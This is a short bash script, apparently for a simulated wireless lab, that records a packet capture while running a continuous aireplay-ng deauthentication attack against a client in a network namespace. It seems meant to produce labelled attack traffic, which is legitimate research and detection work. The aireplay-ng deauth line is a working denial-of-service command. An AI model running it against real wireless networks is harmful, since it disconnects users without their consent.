#!/bin/bash
# usage: sudo ./capture_attack.sh attack_1.pcap
OUT=$1
BSSID=$(ip -br link show router | awk '{print $3}')
CLIENT=$(ip netns exec client ip -br link show phone | awk '{print $3}')
echo "AP=$BSSID client=$CLIENT"
timeout 90 tcpdump -i listener -w $OUT >/dev/null 2>&1 &
ip netns exec client ping -i 0.2 -c 450 10.0.0.1 >/dev/null 2>&1 &
sleep 30
timeout 30 aireplay-ng --ignore-negative-one -0 0 -a $BSSID -c $CLIENT listener
wait
chown $SUDO_USER $OUT
echo "saved $OUT"
